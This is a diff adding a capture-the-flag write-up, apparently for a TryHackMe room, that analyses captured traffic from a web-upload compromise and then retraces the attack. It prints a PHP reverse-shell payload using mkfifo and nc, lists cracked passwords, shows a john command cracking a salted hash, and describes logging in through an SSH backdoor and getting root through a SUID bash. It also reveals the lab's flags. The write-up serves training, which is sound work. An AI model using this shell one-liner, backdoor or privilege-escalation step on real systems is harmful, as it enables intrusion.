@@ -1,0 +1,87 @@
+Analysing network traffic : 
+
+Filter out get requests : 
+
+url used : /development
+
+uploads folder : /development/uploads
+
+PHP Shell : payload.php
+
+Attacker IP : 192.168.170.159
+
+Victim IP : 192.168.170.145
+
+
+
+Lets filter out post requests : 
+
+Got a file upload request : PHP file upload : payload.php : Select and follow stream.
+
+File content : <?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.170.145 4242 >/tmp/f")?>
+
+
+
+Filter source ip = Attacker IP, TCP port 4242, and follow the stream,
+
+Username : james
+Password : whenevernoteartinstant
+
+The attacker can run all sudo commads with this id:
+
+He created a backdoor using : https://github.com/NinjaJc01/ssh-backdoor
+
+We can also get the shodow file dump and crack th passwords :
+
+	bee : secuirty3
+	muriland : 1qaz2wsx
+	paradox : secuirty3
+	szymex : abcd123
+
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Lets get the backdoor and analysing it:
+
+Lets read through the go script : 
+	We found the hash string : bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3
+
+	In the password_hanndler method we found the salt : 1c362db832f3f864c8c2fe05f2002a05
+
+	We also found the hash type : sha512
+
+Hash used by the attacker : 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+
+Combine the hash and the salt as  : 
+	6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
+	
+Use john to crack the password:
+	john sha512hash --format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt
+
+We got the password : november16
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+Lets get back in:
+
+IP : 10.10.172.7
+
+We know there is a backdoor which we can use.
+
+lets use the attackers password we just used.
+
+We are in ssh on port 2222 as james.
+
+We can find user.txt in james home directory : thm{d119b4fa8c497ddb0525f7ad200e6567}
+
+
+Priv Esc : Lets enumerate...
+
+We foud a hidden bash suid script in james home folder:
+
+Lets use that
+
+We can use ./.suid_bash -p for without password check to get root shell
+
+We are in the root shell, lets get the flag : thm{d53b2684f169360bb9606c333873144d}
+
+!!!
